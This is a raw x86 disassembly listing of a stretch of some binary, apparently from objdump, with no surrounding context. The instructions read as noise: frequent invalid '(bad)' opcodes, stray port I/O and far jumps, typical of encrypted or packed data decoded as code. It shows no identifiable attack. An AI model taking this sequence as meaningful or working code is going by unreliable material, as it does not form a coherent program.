  41ba02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba03:	cmp    DWORD PTR [ebx+0x76da76a4],0x892b75cc
  41ba0d:	pop    edi
  41ba0e:	mov    ?,edi
  41ba10:	fiadd  WORD PTR [eax]
  41ba12:	dec    eax
  41ba13:	dec    ecx
  41ba14:	gs xchg ebx,eax
  41ba16:	mov    ch,0x22
  41ba18:	div    DWORD PTR [eax-0x5f42fa59]
  41ba1e:	push   ebp
  41ba1f:	aam    0x4f
  41ba21:	add    ch,0xb8
  41ba24:	jmp    0x41b9ff
  41ba26:	pop    ss
  41ba27:	add    eax,0xcc641b1b
  41ba2c:	outs   dx,BYTE PTR ds:[esi]
  41ba2d:	jmp    0x41ba07
  41ba2f:	or     DWORD PTR [esi-0x50],edx
  41ba32:	mov    esp,0x2ecc345f
  41ba37:	jmp    0xfef6a2f0
  41ba3c:	inc    esp
  41ba3d:	mov    WORD PTR [eax+0x5],ss
  41ba40:	push   ebx
  41ba41:	dec    esi
  41ba42:	or     al,0xb1
  41ba44:	es in  al,0xcd
  41ba47:	sbb    BYTE PTR [ebx-0x5d056b12],0x99
  41ba4e:	call   0x7c37:0x8171c5c3
  41ba55:	mov    dl,BYTE PTR [esp+ebp*2-0x24]
  41ba59:	pusha  
  41ba5a:	aam    0xb2
  41ba5c:	aas    
  41ba5d:	ins    BYTE PTR es:[edi],dx
  41ba5e:	pusha  
  41ba5f:	xchg   edx,edi
  41ba61:	fdiv   DWORD PTR [edi+edx*2+0x1a]
  41ba65:	mov    bl,0xb7
  41ba67:	loopne 0x41ba31
  41ba69:	mov    bh,0xb2
  41ba6b:	(bad)  
  41ba6c:	icebp  
  41ba6d:	lods   al,BYTE PTR ds:[esi]
  41ba6e:	call   0xea91f86e
  41ba73:	mov    bh,0xff
  41ba75:	addr16 sti 
  41ba77:	scas   al,BYTE PTR es:[edi]
  41ba78:	dec    edi
  41ba79:	mov    bl,BYTE PTR [ecx-0x62]
  41ba7c:	pusha  
  41ba7d:	je     0x41ba47
  41ba7f:	pusha  
  41ba80:	mov    cl,0x58
  41ba82:	cmp    DWORD PTR ds:0xe849a04c,0xffffff95
  41ba89:	mov    edx,0x8f4b09c3
  41ba8e:	sub    BYTE PTR ds:0x7d6c8e78,ch
  41ba94:	popa   
  41ba95:	and    al,BYTE PTR [eax-0x31]
  41ba98:	jbe    0x41bacf
  41ba9a:	in     al,dx
  41ba9b:	xlat   BYTE PTR ds:[ebx]
  41ba9c:	jle    0x41baaa
  41ba9e:	sub    eax,0xf1357e
  41baa3:	jbe    0x41ba48
  41baa5:	push   esp
  41baa6:	retf   0xe84
  41baa9:	cmp    esi,DWORD PTR [eax+ebp*1-0x46a124e4]
  41bab0:	pop    ss
  41bab1:	into   
  41bab2:	test   eax,0xbe629f20
  41bab7:	paddb  mm2,QWORD PTR [edx]
  41baba:	arpl   si,dx
  41babc:	cmp    bl,BYTE PTR [eax-0x40]
  41babf:	pop    esi
  41bac0:	hlt    
  41bac1:	xchg   ebp,eax
  41bac2:	mov    esp,0x56aa59d3
  41bac7:	xlat   BYTE PTR ds:[ebx]
  41bac8:	retf   0x29a
  41bacb:	push   ss
  41bacc:	jnp    0x41ba68
  41bace:	add    cl,BYTE PTR [edi-0x54e4ff9]
  41bad4:	xchg   ebx,eax
  41bad5:	sbb    DWORD PTR [esi+eax*4],esi
  41bad8:	lods   eax,DWORD PTR ds:[esi]
  41bad9:	inc    edi
  41bada:	test   al,0x0
  41badc:	and    BYTE PTR [ebx+0x698c8171],0x82
  41bae3:	jns    0x41ba86
  41bae5:	dec    edx
  41bae6:	sub    edi,eax
  41bae8:	xchg   BYTE PTR [ecx],ch
  41baea:	mov    bl,0xfa
  41baec:	int3   
  41baed:	(bad)  
  41baee:	jmp    0x41ba9d
  41baf0:	xor    eax,0x33033c64
  41baf5:	cs call 0x6d37:0xcc0d5622
  41bafd:	ins    DWORD PTR es:[edi],dx
  41bafe:	out    dx,al
  41baff:	xchg   edi,eax
  41bb00:	adc    eax,0x2f24d09d
  41bb05:	fadd   QWORD PTR ds:0x2258cb58
  41bb0b:	sbb    esi,DWORD PTR [edx+0x41]
  41bb0e:	jecxz  0x41ba99
  41bb10:	sbb    eax,0xf33a392e
  41bb15:	sub    esp,edx
  41bb17:	mov    eax,ds:0x60f0d0c5
  41bb1c:	sub    esi,ecx
  41bb1e:	add    ecx,DWORD PTR [edi-0x1b]
  41bb21:	ror    BYTE PTR [ebx+0x3d],0xa0
  41bb25:	mov    esi,0xc1ba0d48
  41bb2a:	ins    BYTE PTR es:[edi],dx
  41bb2b:	xchg   ebp,eax
  41bb2c:	xchg   edx,eax
  41bb2d:	in     eax,0x40
  41bb2f:	jmp    0x856e0749
  41bb34:	ror    BYTE PTR [edi+0x3b],0xb7
  41bb38:	xor    bh,BYTE PTR [ebx+0x489d7546]
  41bb3e:	mov    dl,0xe7
  41bb40:	mov    ebp,0xb97e26fc
  41bb45:	leave  
  41bb46:	add    al,0xe
  41bb48:	in     eax,0xc5
  41bb4a:	mov    ?,WORD PTR [ebx]
  41bb4c:	sar    DWORD PTR [esp+ebp*8-0x6d756113],cl
  41bb53:	or     DWORD PTR [ebx+ebx*8],esi
  41bb56:	sbb    ah,BYTE PTR [esi]
  41bb58:	add    eax,0x9b6eb9bc
  41bb5d:	loopne 0x41bb13
  41bb5f:	sub    al,0xd2
  41bb61:	stos   DWORD PTR es:[edi],eax
  41bb62:	or     eax,0xdc69b608
  41bb67:	call   0x67f74a46
  41bb6c:	mov    cl,0x7c
  41bb6e:	and    al,0xa5
  41bb70:	pop    ss
  41bb71:	mov    eax,DWORD PTR [ecx+0x176a1f56]
  41bb77:	adc    eax,0xb40c9fe6
  41bb7c:	pop    edx
  41bb7d:	aas    
  41bb7e:	mov    eax,ds:0x8d66ff99
  41bb83:	sub    eax,0x5e1df09a
  41bb88:	fdivr  QWORD PTR [ebp+0x46]
  41bb8b:	mov    bh,0xd1
  41bb8d:	ja     0x41bbf2
  41bb8f:	inc    ebx
  41bb90:	in     eax,0xf0
  41bb92:	(bad)  
  41bb93:	retf   
  41bb94:	add    DWORD PTR [edx-0x15],edi
  41bb97:	dec    ecx
  41bb98:	shr    ebx,1
  41bb9a:	inc    edx
  41bb9b:	cs ret 
  41bb9d:	inc    esp
  41bb9e:	test   eax,0x17d09104
  41bba3:	push   ss
  41bba4:	add    al,0xab
  41bba6:	adc    ecx,DWORD PTR [esi+0x618daa0f]
  41bbac:	and    DWORD PTR [ebx-0x20],edi
  41bbaf:	mov    al,ds:0x17499084
  41bbb4:	ins    BYTE PTR es:[edi],dx
  41bbb5:	mov    ah,0x4d
  41bbb7:	fbstp  TBYTE PTR [eax+eiz*8+0x69]
  41bbbb:	inc    eax
  41bbbc:	out    0xc9,al
  41bbbe:	mov    al,ds:0xdc717e80
  41bbc3:	push   edx
  41bbc4:	jb     0x41bc09
  41bbc6:	pop    ecx
  41bbc7:	fwait
  41bbc8:	jmp    0xc234:0xd5d89e15
  41bbcf:	nop
  41bbd0:	mov    ecx,0x73af5c89
  41bbd5:	pop    edx
  41bbd6:	xchg   ebx,eax
  41bbd7:	div    BYTE PTR [ebx-0x55b35bbd]
  41bbdd:	in     al,dx
  41bbde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbdf:	dec    edi
  41bbe0:	adc    al,0xe8
  41bbe2:	lea    edi,[eax]
  41bbe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbe5:	out    0x62,eax
  41bbe7:	push   ds
  41bbe8:	das    
  41bbe9:	dec    eax
  41bbea:	sbb    ecx,DWORD PTR [esi-0x54]
  41bbed:	pop    ebx
  41bbee:	ret    0x8fcd
  41bbf1:	lock ror dl,1
  41bbf4:	xchg   edx,eax
  41bbf5:	imul   esp,DWORD PTR [eax+edi*1-0x75],0x36aaa52
  41bbfd:	push   0x7514e296
  41bc02:	les    ebx,FWORD PTR [ebx-0x25]
  41bc05:	push   eax
  41bc06:	test   al,0x4
  41bc08:	and    BYTE PTR [edx+0x5db6bad7],dh
  41bc0e:	pop    esi
  41bc0f:	pop    edx
  41bc10:	xchg   edx,eax
  41bc11:	shr    DWORD PTR [ebx-0xa8bb4ef],1
  41bc17:	sbb    eax,DWORD PTR [ebx+0x3b]
  41bc1a:	mov    ds:0x2d7544b2,al
  41bc1f:	data16 jle 0x41bbd8
  41bc22:	sbb    eax,0x80ed72d
  41bc27:	ins    DWORD PTR es:[edi],dx
  41bc28:	pop    eax
  41bc29:	push   0xffffffa0
  41bc2b:	jp     0x41bc6c
  41bc2d:	sub    bl,dl
  41bc2f:	ins    BYTE PTR es:[edi],dx
  41bc30:	xlat   BYTE PTR ds:[ebx]
  41bc31:	ds dec edi
  41bc33:	imul   esi,DWORD PTR [ebp-0x51d6f25b],0xffffffc5
  41bc3a:	loope  0x41bc35
  41bc3c:	mov    bl,0x39
  41bc3e:	imul   BYTE PTR [ebp+0x28]
  41bc41:	adc    eax,0xa8dc95ed
  41bc46:	adc    BYTE PTR [eax+edx*1+0x34],al
  41bc4a:	and    ah,BYTE PTR ds:0x4d035a03
  41bc50:	ret    0xcc6
  41bc53:	pop    esi
  41bc54:	mov    edi,DWORD PTR ds:0xca667ba8
  41bc5a:	out    dx,eax
  41bc5b:	fsub   DWORD PTR [eax-0xb]
  41bc5e:	adc    esi,0x6f9c85fd
  41bc64:	ins    BYTE PTR es:[edi],dx
  41bc65:	pushf  
  41bc66:	xchg   BYTE PTR [esp+esi*2-0x49],bh
  41bc6a:	and    BYTE PTR [edi],0x5c
  41bc6d:	fs pop eax
  41bc6f:	pop    esi
  41bc70:	stos   BYTE PTR es:[edi],al
  41bc71:	jp     0x41bcd0
  41bc73:	mov    eax,0x6b858108
  41bc78:	add    dl,al
  41bc7a:	vpmulhuw ymm2,ymm4,YMMWORD PTR [edi+0x47]
  41bc7f:	push   esi
  41bc80:	jns    0x41bc95
  41bc82:	cmp    ebp,DWORD PTR ds:0xef41e7bd
  41bc88:	sar    DWORD PTR [ebx],0x25
  41bc8b:	jne    0x41bc90
  41bc8d:	jmp    0x7a2895fb
  41bc92:	jle    0x41bcb8
  41bc94:	sub    eax,DWORD PTR [esi]
  41bc96:	sbb    BYTE PTR [ebp+0x58],0xb3
  41bc9a:	pop    ecx
  41bc9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc9c:	xlat   BYTE PTR ds:[ebx]
  41bc9d:	pop    eax
  41bc9e:	ror    BYTE PTR [esi+0x76],0xe
  41bca2:	lods   al,BYTE PTR ds:[esi]
  41bca3:	jmp    0x41bcab
  41bca5:	sub    al,0xb9
  41bca7:	xchg   esp,eax
  41bca8:	scas   eax,DWORD PTR es:[edi]
  41bca9:	repz jmp 0xd78e59ee
  41bcaf:	and    ebp,DWORD PTR [ebx]
  41bcb1:	sbb    eax,0x9e06f712
  41bcb6:	(bad)  
  41bcb7:	repnz and BYTE PTR [ebx],0x3c
  41bcbb:	js     0x41bc62
  41bcbd:	jle    0x41bd1d
  41bcbf:	aam    0xb3
  41bcc1:	aas    
  41bcc2:	cmp    ch,BYTE PTR [eax]
  41bcc4:	rcr    DWORD PTR ds:0x5386e2fb,cl
  41bcca:	rcl    BYTE PTR [esi+0x5ccb94b5],cl
  41bcd0:	rcl    BYTE PTR [ebx+0x64c16dba],1
  41bcd6:	cmp    BYTE PTR [edi-0x34],0x92
  41bcda:	push   es
  41bcdb:	mov    eax,ds:0x1c0d2b51
  41bce0:	addr16 mov ecx,ebx
  41bce3:	sbb    al,0xd3
  41bce5:	out    0x60,al
  41bce7:	out    0x83,al
  41bce9:	push   edx
  41bcea:	push   ecx
  41bceb:	out    0x59,eax
  41bced:	jecxz  0x41bcb0
  41bcef:	scas   al,BYTE PTR es:[edi]
  41bcf0:	cs std 
  41bcf2:	push   ss
  41bcf3:	jle    0x41bd52
  41bcf5:	cli    
  41bcf6:	xchg   ebp,eax
  41bcf7:	div    DWORD PTR [ecx]
  41bcf9:	xchg   edx,eax
  41bcfa:	mov    eax,DWORD PTR [esi-0x6f21149d]
  41bd00:	scas   eax,DWORD PTR es:[edi]
  41bd01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd02:	add    BYTE PTR [ebp-0x7bdd8023],0x61
  41bd09:	adc    eax,0x979d74f8
  41bd0e:	xchg   ebx,eax
  41bd0f:	push   cs
  41bd10:	shl    BYTE PTR [ebx+0x53],cl
  41bd13:	mov    eax,ds:0x103c7d00
  41bd18:	xchg   ebx,eax
  41bd19:	sub    esp,edx
  41bd1b:	in     eax,dx
  41bd1c:	iret   
  41bd1d:	xor    esi,DWORD PTR [edi-0x19]
  41bd20:	cmp    BYTE PTR [ebx-0x7],dh
  41bd23:	(bad)  
  41bd25:	ret    0xb9d
  41bd28:	sub    esp,ecx
  41bd2a:	(bad)  
  41bd2b:	xor    DWORD PTR [ecx],edx
  41bd2d:	outs   dx,BYTE PTR ds:[esi]
  41bd2f:	or     edx,DWORD PTR [edi+0x6f324e42]
  41bd35:	xchg   BYTE PTR [ebx],ah
  41bd37:	mov    ch,0x63
  41bd39:	add    dl,BYTE PTR [ecx-0x22ab99f7]
  41bd3f:	sbb    BYTE PTR [ebp+0x6d],al
  41bd42:	push   ds
  41bd43:	cli    
  41bd44:	dec    ebp
  41bd45:	mov    BYTE PTR [edx-0x659a3185],bl
  41bd4b:	xchg   esi,eax
  41bd4c:	arpl   cx,bp
  41bd4e:	mov    BYTE PTR [esi+ebx*2+0x115dd61c],cl
  41bd55:	sbb    ebx,esi
  41bd57:	and    al,0xd
  41bd59:	push   0x6a
  41bd5b:	push   esi
  41bd5c:	mov    di,0x54e7
  41bd60:	inc    ebp
  41bd61:	jmp    FWORD PTR [eax-0x2a]
  41bd64:	cld    
  41bd65:	add    DWORD PTR [esi+ebp*2+0x28],ecx
  41bd69:	je     0x41bddf
  41bd6b:	mov    esp,0x66576997
  41bd70:	lds    ebp,FWORD PTR [edi-0x14]
  41bd73:	jp     0x41bdd2
  41bd75:	cmc    
  41bd76:	(bad)  
  41bd78:	push   ds
  41bd79:	mov    ds:0x594e8df8,al
  41bd7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd7f:	xchg   esp,eax
  41bd80:	or     edi,DWORD PTR [edi-0x6]
  41bd83:	stc    
  41bd84:	mov    al,0x33
  41bd86:	inc    ebp
  41bd87:	sbb    al,0xe8
  41bd89:	adc    DWORD PTR [edx+esi*2+0x2e],ebp
  41bd8d:	arpl   WORD PTR [ebx],cx
  41bd8f:	fsub   QWORD PTR [ebp-0x77c0df9]
  41bd95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd96:	test   BYTE PTR [esi],bh
  41bd98:	pusha  
  41bd99:	mov    ah,0xdc
  41bd9b:	push   edx
  41bd9c:	cld    
  41bd9d:	xor    ah,dh
  41bd9f:	and    BYTE PTR [esi+0x63],bl
  41bda2:	dec    ebx
  41bda3:	xchg   ebx,eax
  41bda4:	fidivr DWORD PTR [ebx]
  41bda6:	or     DWORD PTR [ecx+ebx*8-0x4b],edx
  41bdaa:	pop    eax
  41bdab:	xchg   ecx,eax
  41bdac:	and    al,BYTE PTR [ebx]
  41bdae:	mov    al,0x2a
  41bdb0:	or     dh,0x94
  41bdb3:	arpl   WORD PTR [edi],ax
  41bdb5:	pop    ebp
  41bdb6:	mov    dl,0x20
  41bdb8:	inc    ebx
  41bdb9:	and    edi,esi
  41bdbb:	ror    BYTE PTR [edi],0x21
  41bdbe:	dec    ecx
  41bdbf:	mov    ah,0x93
  41bdc1:	call   0xeae:0x1ddbce3e
  41bdc8:	inc    edi
  41bdc9:	and    al,0xab
  41bdcb:	mov    dh,0x7f
  41bdcd:	daa    
  41bdce:	mov    bh,0x4a
  41bdd0:	sbb    al,0x0
  41bdd2:	test   esp,ecx
  41bdd4:	retf   
  41bdd5:	dec    ebx
  41bdd6:	inc    edx
  41bdd7:	leave  
  41bdd8:	sbb    ch,bh
  41bdda:	sub    eax,DWORD PTR [eax+0x4]
  41bddd:	push   eax
  41bdde:	push   0x30df78cb
  41bde3:	mov    ch,BYTE PTR [esi]
  41bde5:	pop    ebx
  41bde6:	lock sbb BYTE PTR gs:[edx],dl
  41bdea:	dec    esp
  41bdeb:	xor    esi,DWORD PTR ds:0x79899e83
  41bdf1:	in     eax,0x4f
  41bdf3:	dec    ebp
  41bdf4:	push   ebx
  41bdf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdf6:	out    0xb7,al
  41bdf8:	ds mov edx,0xfcdab14a
  41bdfe:	dec    edi
  41bdff:	das    
  41be00:	xchg   esi,eax
  41be01:	jmp    FWORD PTR [edx]
  41be03:	adc    ah,BYTE PTR [si]
  41be06:	lahf   
  41be07:	daa    
  41be08:	fisttp WORD PTR [edx+0x43353a]
  41be0e:	mov    ebx,0x2e62970
  41be13:	jo     0x41be2f
  41be15:	adc    eax,0xb5e846b9
  41be1a:	int    0x97
  41be1c:	adc    ch,BYTE PTR [ecx]
  41be1e:	pop    esp
  41be1f:	sbb    al,0x7
  41be21:	idiv   BYTE PTR [edi-0x7f]
  41be24:	pop    esp
  41be25:	popf   
  41be26:	jle    0x41be90
  41be28:	sbb    eax,0x48d26df9
  41be2d:	bound  eax,QWORD PTR [ecx-0x262015d9]
  41be33:	cmp    ecx,0xffffff85
  41be36:	mov    esp,0xfd8f520d
  41be3b:	jle    0x41be67
  41be3d:	(bad)  
  41be3e:	shl    BYTE PTR [ecx-0x27],cl
  41be41:	jae    0x41bde4
  41be43:	dec    edx
  41be44:	mov    dl,0x4d
  41be46:	ss cmp al,0x2
  41be49:	sbb    eax,0xdbd940ce
  41be4e:	mov    esi,0x13c8bff4
  41be53:	lods   eax,DWORD PTR ds:[esi]
  41be54:	std    
  41be55:	jnp    0x41be6d
  41be57:	inc    esi
  41be58:	push   esp
  41be59:	mov    DWORD PTR ds:0x25f51c03,esi
  41be5f:	imul   edi,DWORD PTR [esi],0xfffffff8
  41be62:	push   edi
  41be63:	pop    esp
  41be64:	test   eax,0x2d18efd0
  41be69:	xor    DWORD PTR [ebx],esi
  41be6b:	inc    esp
  41be6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be6d:	popa   
  41be6e:	daa    
  41be6f:	mov    dl,0x6e
  41be71:	call   0x4d175243
  41be76:	cli    
  41be77:	(bad)  
  41be78:	(bad)  
  41be79:	aas    
  41be7a:	pop    ebx
  41be7b:	test   BYTE PTR fs:[ecx+0x4c],0x2
  41be80:	dec    ebp
  41be81:	clc    
  41be82:	sbb    eax,0x4afd596c
  41be87:	outs   dx,DWORD PTR ds:[esi]
  41be88:	pop    ds
  41be89:	in     eax,0xb
  41be8b:	leave  
  41be8c:	inc    esi
  41be8d:	scas   al,BYTE PTR es:[edi]
  41be8e:	xchg   BYTE PTR [ecx+0x44],al
  41be91:	cld    
  41be92:	push   edx
  41be93:	retf   
  41be94:	adc    bl,ch
  41be96:	push   0x4004c8cc
  41be9b:	les    edi,FWORD PTR [eax]
  41be9d:	mov    dl,0xf6
  41be9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bea0:	(bad)  
  41bea1:	sti    
  41bea2:	mov    ah,0x6c
  41bea4:	push   eax
  41bea5:	pop    es
  41bea6:	push   edi
  41bea7:	fistp  WORD PTR [esi+0x7a]
  41beaa:	sbb    DWORD PTR [ebx],ebx
  41beac:	imul   esi,DWORD PTR [eax-0x3c],0x688af9d1
  41beb3:	jbe    0x41bea1
  41beb5:	mov    esp,0xb97206cb
  41beba:	(bad)  
  41bebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bebc:	mov    ds:0xccf94fa6,eax
  41bec1:	je     0x41be61
  41bec3:	inc    ebx
  41bec4:	mov    ecx,0xc580565e
  41bec9:	test   DWORD PTR [edx+eiz*4+0x225fc76c],eax
  41bed0:	push   edi
  41bed1:	inc    ebp
  41bed2:	ficom  WORD PTR [ebx-0x58]
  41bed5:	xlat   BYTE PTR ds:[ebx]
  41bed6:	xor    ecx,esp
  41bed8:	scas   eax,DWORD PTR es:[edi]
  41bed9:	jmp    0x4281:0x6e1e895f
  41bee0:	sub    BYTE PTR ss:[ebx+ebp*8+0x48824e59],dh
  41bee8:	xor    DWORD PTR [edx],ebx
  41beea:	dec    edx
  41beeb:	sub    BYTE PTR [eax-0xc1ee509],0x19
  41bef2:	cmp    DWORD PTR [eax-0x6da18bb2],edx
  41bef8:	jl     0x41bf34
  41befa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41befb:	dec    esi
  41befc:	shl    DWORD PTR [ebx],1
  41befe:	cli    
  41beff:	or     DWORD PTR [ecx+0x7068b207],esp
  41bf05:	lahf   
  41bf06:	lock inc ecx
  41bf08:	sub    eax,0x68bca507
  41bf0d:	popf   
  41bf0e:	adc    DWORD PTR [esp+edi*2+0x6f],0xc769427
  41bf16:	pop    esp
  41bf17:	test   eax,0x4d9398df
  41bf1c:	push   edx
  41bf1d:	sbb    DWORD PTR [ecx+0x14a5a878],eax
  41bf23:	retf   
  41bf24:	jmp    0xd4c3e6d5
  41bf29:	mov    ds:0x1fcb15a,eax
  41bf2e:	loop   0x41bed8
  41bf30:	jne    0x41bf72
  41bf32:	xor    ch,cl
  41bf34:	(bad)  
  41bf35:	pusha  
  41bf36:	stc    
  41bf37:	mov    bl,0x10
  41bf39:	mov    ebx,ebp
  41bf3b:	lock sbb DWORD PTR [eax+0x6b],esp
  41bf3f:	xor    BYTE PTR [ecx+0x32],cl
  41bf42:	stos   DWORD PTR es:[edi],eax
  41bf43:	jns    0x41bee8
  41bf45:	into   
  41bf46:	adc    esp,DWORD PTR [ecx+0x7007d7ea]
  41bf4c:	jl     0x41bf09
  41bf4e:	dec    ebx
  41bf4f:	ror    DWORD PTR [ebp+0x34],0xfe
  41bf53:	mov    BYTE PTR [esp+edi*1],bl
  41bf56:	cmp    al,0xaa
  41bf58:	out    0x1,al
  41bf5a:	sbb    bl,bl
  41bf5c:	pop    ds
  41bf5d:	fcom   DWORD PTR [ebx-0x29]
  41bf60:	(bad)  [esi-0x61]
  41bf63:	push   0x74f8135d
  41bf68:	jle    0x41bf21
  41bf6a:	cs gs mov cl,0xf8
  41bf6e:	xlat   BYTE PTR ds:[ebx]
  41bf6f:	pop    ecx
  41bf70:	pop    edi
  41bf71:	fild   WORD PTR [esi+0x2d]
  41bf74:	or     edi,ecx
  41bf76:	aam    0x9c
  41bf78:	mul    DWORD PTR [ebp-0x52]
  41bf7b:	pop    esp
  41bf7c:	cwde   
  41bf7d:	retf   
  41bf7e:	(bad)  
  41bf7f:	push   ds
  41bf80:	pop    eax
  41bf81:	xchg   ecx,eax
  41bf82:	sbb    BYTE PTR [edi+0x50],0x20
  41bf86:	outs   dx,DWORD PTR ds:[esi]
  41bf87:	mov    edi,ebp
  41bf89:	push   eax
  41bf8a:	(bad)  
  41bf8c:	inc    esp
  41bf8d:	arpl   WORD PTR [esi+ecx*8-0x47],bx
  41bf91:	(bad)  
  41bf92:	hlt    
  41bf93:	loope  0x41c008
  41bf95:	inc    ebx
  41bf96:	xor    DWORD PTR [ecx+0x2d],ebx
  41bf99:	pop    ebx
  41bf9a:	mov    edi,0x400d35a2
  41bf9f:	jbe    0x41bf26
  41bfa1:	shl    esi,cl
  41bfa3:	sbb    BYTE PTR [edx+0x65],ch
  41bfa6:	mov    dl,0x8
  41bfa8:	mov    ecx,0x5b162d70
  41bfad:	push   cs
  41bfae:	je     0x41bfe9
  41bfb0:	outs   dx,BYTE PTR ds:[esi]
  41bfb1:	pop    edx
  41bfb2:	xor    dl,BYTE PTR [edx+0x42]
  41bfb5:	push   ecx
  41bfb6:	inc    esp
  41bfb7:	mov    esi,0xbe01064d
  41bfbc:	jne    0x41bfbf
  41bfbe:	fisttp QWORD PTR [ebp+0x5a678b0d]
  41bfc4:	ss stos DWORD PTR es:[di],eax
  41bfc7:	cmp    ecx,esp
  41bfc9:	nop
  41bfca:	ret    0x1a3f
  41bfcd:	test   al,0x52
  41bfcf:	mov    ebp,0x3ed482c8
  41bfd4:	inc    edx
  41bfd5:	shr    DWORD PTR [ecx-0x7],1
  41bfd8:	mov    esp,0x756dff85
  41bfdd:	dec    esi
  41bfde:	mov    dl,0xfa
  41bfe0:	cs xor al,0xc2
  41bfe3:	in     eax,dx
  41bfe4:	jns    0x41c039
  41bfe6:	rol    DWORD PTR [edi-0x78],1
  41bfe9:	mov    ch,0xf8
  41bfeb:	(bad)  
  41bfec:	push   ebp
  41bfed:	mov    edx,0xecc45289
  41bff2:	xchg   DWORD PTR [eax],ebx
  41bff4:	push   ebx
  41bff5:	mov    fs,esi
  41bff7:	xchg   BYTE PTR [eax],ah
  41bff9:	sbb    al,bl
  41bffb:	lods   al,BYTE PTR ds:[esi]
  41bffc:	fsubrp st(0),st
  41bffe:	mov    esi,0xf51f4695
  41c003:	iret   
  41c004:	and    dl,BYTE PTR [eax+0x24b020c7]
  41c00a:	fistp  WORD PTR [ebx-0x4e5cf9e9]
  41c010:	mov    bl,0x7
  41c012:	shl    ebp,0xeb
  41c015:	sbb    eax,0x2ba9abd5
  41c01a:	adc    eax,0x2247c0a8
  41c01f:	shr    DWORD PTR [eax+0x1e1a47e2],cl
  41c025:	call   0x4ad3:0x57766bd2
  41c02c:	push   edx
  41c02d:	test   BYTE PTR [esp+ecx*8-0x4a139301],dl
  41c034:	call   0x91b8825
  41c039:	adc    eax,DWORD PTR [esi+0x17ca67a6]
  41c03f:	fsub   st(6),st
  41c041:	pop    ecx
  41c042:	mov    ecx,0x87684a6a
  41c047:	out    0x7f,al
  41c049:	hlt    
  41c04a:	push   ebx
  41c04b:	pop    ebx
  41c04c:	fmul   DWORD PTR [edi-0x30bc59a8]
  41c052:	arpl   WORD PTR [esi-0x7a99b8e0],sp
  41c058:	repz inc eax
  41c05a:	ds (bad) 
  41c05c:	jne    0x41c04e
  41c05e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c05f:	cmp    bl,0x25
  41c062:	cdq    
  41c063:	cmp    eax,0x42aaa9e1
  41c068:	push   0x55
  41c06a:	sbb    al,dl
  41c06c:	push   edi
  41c06d:	nop
  41c06e:	pop    ds
  41c06f:	sbb    al,0x70
  41c071:	push   edx
  41c072:	mov    dh,BYTE PTR [edx-0x51]
  41c075:	dec    eax
  41c076:	popf   
  41c077:	je     0x41c07d
  41c079:	outs   dx,DWORD PTR ds:[esi]
  41c07a:	std    
  41c07b:	pop    ds
  41c07c:	inc    ebx
  41c07d:	cwde   
  41c07e:	js     0x41c007
  41c080:	mov    al,0xf7
  41c082:	call   0x9b935cb5
  41c087:	imul   DWORD PTR [esi+0x65f1a168]
  41c08d:	mov    edi,esp
  41c08f:	jmp    0x41c0a6
  41c091:	pop    edx
  41c092:	and    eax,0x29b57c8c
  41c097:	xchg   ecx,eax
  41c098:	aad    0xec
  41c09a:	loopne 0x41c104
  41c09c:	(bad)  
  41c09d:	stc    
  41c09e:	push   esi
  41c09f:	mov    al,0x48
  41c0a1:	jo     0x41c0be
  41c0a3:	push   esp
  41c0a4:	mov    dh,0xb1
  41c0a6:	cwde   
  41c0a7:	pop    ecx
  41c0a8:	and    eax,0x3e097a25
  41c0ad:	shl    DWORD PTR [edx+0x59cf185f],cl
  41c0b3:	enter  0xa84e,0x9d
  41c0b7:	fldenv [ebx-0x7a31a367]
  41c0bd:	inc    edi
  41c0be:	sbb    eax,DWORD PTR [esi]
  41c0c0:	mov    bl,0x14
  41c0c2:	or     DWORD PTR [ebx+0x4d],0x35
  41c0c6:	cmp    DWORD PTR [ebp-0x6a454a27],ebp
  41c0cc:	adc    DWORD PTR [ebx-0x1d],ebx
  41c0cf:	push   cs
  41c0d0:	sbb    BYTE PTR [eax],bl
  41c0d2:	clc    
  41c0d3:	not    BYTE PTR [edi-0x12afa9d4]
  41c0d9:	cwde   
  41c0da:	push   0xffffffa9
  41c0dc:	test   BYTE PTR [edx-0x5b94da9a],dh
  41c0e2:	mov    ebx,0x227ffb0d
  41c0e7:	jmp    DWORD PTR es:[ecx+0x2d]
  41c0eb:	jmp    0xf2e621b3
  41c0f0:	imul   edx,ecx,0xd80d7560
  41c0f6:	(bad)  
  41c0f7:	fdivp  st(2),st
  41c0f9:	and    BYTE PTR ds:0x99c1c32,dl
  41c0ff:	repnz stc 
  41c101:	cld    
  41c102:	jb     0x41c092
  41c104:	pop    ebp
  41c105:	(bad)  
  41c106:	hlt    
  41c107:	jbe    0x41c0e3
  41c109:	popa   
  41c10a:	lds    esp,FWORD PTR [edi-0x472c5fc0]
  41c110:	mov    ds:0xb1e4001b,al
  41c115:	mov    bh,0x79
  41c117:	xchg   ecx,eax
  41c118:	sub    al,0xcb
  41c11a:	das    
  41c11b:	jae    0x41c172
  41c11d:	adc    cl,ch
  41c11f:	rol    DWORD PTR [edx+0x69],cl
  41c122:	test   DWORD PTR [eax],ecx
  41c124:	stc    
  41c125:	fwait
  41c126:	jno    0x41c0e7
  41c128:	aam    0xcf
  41c12a:	jge    0x41c11f
  41c12c:	pop    esi
  41c12d:	lods   al,BYTE PTR ds:[esi]
  41c12e:	call   0xf99df3f8
  41c133:	sub    eax,0x151ee653
  41c138:	pop    eax
  41c139:	addr16 ja 0x41c149
  41c13c:	enter  0xc299,0xb6
  41c140:	inc    esp
  41c141:	push   0xdd6401
  41c146:	(bad)  
  41c147:	les    ebx,FWORD PTR [ebx-0x10]
  41c14a:	or     al,0x30
  41c14c:	enter  0xfb81,0x4c
  41c150:	fcmovbe st,st(7)
  41c152:	sub    DWORD PTR [edi-0x2fd6117d],ecx
